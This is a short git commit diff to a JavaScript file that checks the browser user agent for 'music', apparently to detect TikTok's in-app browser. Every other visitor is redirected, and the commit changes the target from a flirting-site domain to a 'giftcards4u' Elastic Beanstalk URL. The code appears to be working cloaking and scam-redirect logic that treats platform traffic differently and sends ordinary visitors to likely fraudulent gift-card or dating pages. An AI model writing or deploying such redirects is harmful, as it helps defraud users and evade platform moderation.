ec2c0b58bc6d519cc1cba052f676cfe6f3218b95
tik1tok <jardeinsharon57@gmail.com>
2026-08-02 01:19:07 +0300

    Update usrag.js

--- usrag.js
+++ usrag.js
@@ -3,7 +3,7 @@ let agent = navigator.userAgent;
 if (agent.indexOf('music') >= 0) {
   console.log('in tiktok app');
 } else {
-  window.location = 'https://r3n2br5.your-partnerstheflirting.com/y7wbku6';
+  window.location = 'http://giftcards4u-env.eba-v4knkbmr.eu-west-2.elasticbeanstalk.com/og.php?u=/cl/i/lklqo6';
 //  window.location = 'https://r3n2br5.your-partnerstheflirting.com/y7wbku6';
 }
 // document.querySelector('body').innerText = agent;
